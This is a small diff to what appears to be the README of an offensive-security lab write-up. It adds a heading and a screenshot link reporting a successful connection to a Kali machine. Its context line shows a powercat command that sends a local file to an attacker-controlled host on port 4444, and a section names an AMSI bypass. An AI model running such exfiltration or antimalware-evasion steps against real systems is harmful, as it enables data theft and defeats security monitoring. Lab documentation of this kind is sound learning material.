@@ -27,6 +27,7 @@ powercat -c <KALI_IP> -p 4444 -i C:\path\to\file.exe
 
 ### 1. AMSI Bypass & Tool Loading
 ![AMSI Bypass Success](./screenshots/windows_bypass.png)
-
+ ### 2. Connection & Data Received !
+[Kali Connection Success](./screenshots/kali_success.png)   
 
 
